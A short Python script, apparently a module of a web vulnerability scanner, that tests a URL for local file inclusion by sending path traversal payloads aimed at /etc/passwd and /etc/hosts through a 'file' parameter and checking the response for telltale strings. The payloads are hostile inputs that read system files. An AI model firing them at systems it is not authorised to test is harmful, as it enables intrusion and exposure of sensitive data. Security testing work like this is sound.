import requests

def check(url):
    print(f"Testing File Inclusion on {url}")
    payloads = ["../../../../etc/passwd", "../../../../etc/hosts"]
    for payload in payloads:
        inclusion_url = f"{url}?file={payload}"
        try:
            response = requests.get(inclusion_url)
            if "root:" in response.text or "127.0.0.1" in response.text:
                print(f"Possible File Inclusion vulnerability found at {inclusion_url}")
        except requests.RequestException as e:
            print(f"Error testing File Inclusion on {url}: {e}")
